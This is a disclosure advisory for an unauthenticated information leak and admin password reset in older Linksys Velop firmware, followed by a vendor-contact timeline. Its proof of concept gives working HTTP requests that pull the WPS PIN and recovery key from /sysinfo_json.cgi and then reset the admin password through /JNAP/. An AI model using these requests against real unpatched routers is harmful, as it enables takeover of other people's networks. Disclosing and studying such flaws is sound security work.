---
published: true
---
## Linksys Velop Authentication Bypass

### Affected Software
Firmware version:	Before 1.1.8.192419
### Product Background
Velop is WHOLE HOMEMESH Wi-Fi system from LINKSYS. It allows users enjoy fast, nonstop Wi-Fi everywhere with Velop’s modular easy-to-use Wi-Fi Mesh system.
There are three categories from their official site :WHW0303,WHW0302,WHW0301. The differences between these three is the pack count: 1, 2 or 3. The system is the same.
### Vulnerability Details
During our analysis, we found a critical bug in its firmware and this vulnerability may allow an unauthenticated user get administrator privilege. The problem is caused by the API of **/sysinfo_json.cgi**, requesting this url will leak sensitive information and may lead to authentication bypass.
#### PoC
We could get some useful information from the PoC below:
~~~http
GET /sysinfo_json.cgi HTTP/1.1
Host: 10.158.1.1
Accept: application/json; charset=UTF-8
Expires: Fri, 10 Oct 2015 14:19:41 GMT
Accept-Encoding: gzip, deflate
Accept-Language: zh-Hans-CN;q=1, en-CN;q=0.9
Cache-Control: no-cache
Content-Type: application/json; charset=UTF-8
User-Agent: Linksys/2.5.2 (iPhone; iOS 11.2.6; Scale/3.00)
Connection: close
~~~

~~~http
HTTP/1.1 200 OK
Connection: close
CONTENT-LANGUAGE: en
Date: Thu, 11 Oct 2012 11:09:15 GMT
Server: lighttpd/1.4.39
Content-Length: 94710

siSections="MfgData,BootData,Syscfg,Sysevent,Messages,Dmesg,Ps,MemoryInfo,CpuInfo,WifiBasicInfo,WifiRadioInfo,WifiClientInfo,WifiPoorClientInfo,WifiLegacyClientInfo,WifiAllAPInfo,WifiSameAPInfo,WifiAllCAInfo,WifiMyCAInfo,IPInfo,PingInfo,Conntrack,ConntrackTotals,ConntrackAvg,Thrulay";
var MfgData = {
 "title": "Manufacturer Data",
 "description": "This is used to manufacturer unit and in SKU API",
 "timestamp": "16:01:02.12/31/69",
 "data": [
{
.......
 "wps_pin": "wps_device_pin = 58163597",
.......
"device_recovery_key": "84667",
.......
 }
 ]
};
......
~~~
The most important value we can get is WPS PIN and Device Recovery Key. For the WPS PIN, we can use it to connect to the wifi even if the wifi password is changed when wps is enabled. Recovery key can be used to reset the admin password, we may construct the following request to change the admin password:
~~~http
POST /JNAP/ HTTP/1.1
Host: 192.168.1.1
Accept: application/json; charset=UTF-8
Expires: Fri, 10 Oct 2015 14:19:41 GMT
Accept-Encoding: gzip, deflate
Accept-Language: zh-Hans-CN;q=1, en-CN;q=0.9
Cache-Control: no-cache
Content-Type: application/json; charset=UTF-8
Content-Length: 48
User-Agent: Linksys/2.5.2 (iPhone; iOS 11.2.6; Scale/3.00)
Connection: close
X-JNAP-Action: http://linksys.com/jnap/nodes/setup/SetAdminPassword

{"resetCode":"84667","adminPassword":"test1234"}
~~~
### Timeline
We reported the bug to the vendor in Feb,2019 and they finally released a patch in August:

~~~text
25 Feb 2019 03:07:55 UTC: We submitted the problem to vendor
26 Feb 2019 20:55:22 UTC: The vendor acknowledged the problem and reproduced it.
31 May 2019 12:39:01 UTC: We asked if there is any updates. No response
06 Jun 2019 03:42:03 UTC: We asked if there is any updates. 
06 Jun 2019 04:41:23 UTC: The vendor reply as: Apologies for the delay in response; the engineering team informs me that a firmware release for Velop will be released later this month. Would you like a preview of this firmware to confirm our fix?
06 Jun 2019 08:28:51 UTC: We replied : No.
25 Jul 2019 00:44:31 UTC: We asked for any updates. No response.
26 Jul 2019 18:22:12 UTC: The vendor replied: We are starting a limited rollout of the release starting tonight and if all goes well, the full release will be opened up in the first week of August. Thank you!
21 Aug 2019 03:38:42 UTC: We asked if there is any updates
23 Aug 2019 21:01:30 UTC: The vendor replied as :We have finally released a fix to address this issue: https://www.linksys.com/us/support-article?articleNum=207568. We have not applied for a CVE and do not have any plans to do so. Thank you!
26 Aug 2019 00:38:08 UTC: We asked we will apply a CVE for this issue
27 Aug 2019 17:23:51 UTC:The vendor replied as :we have no objections if you'd like to file for a CVE.
~~~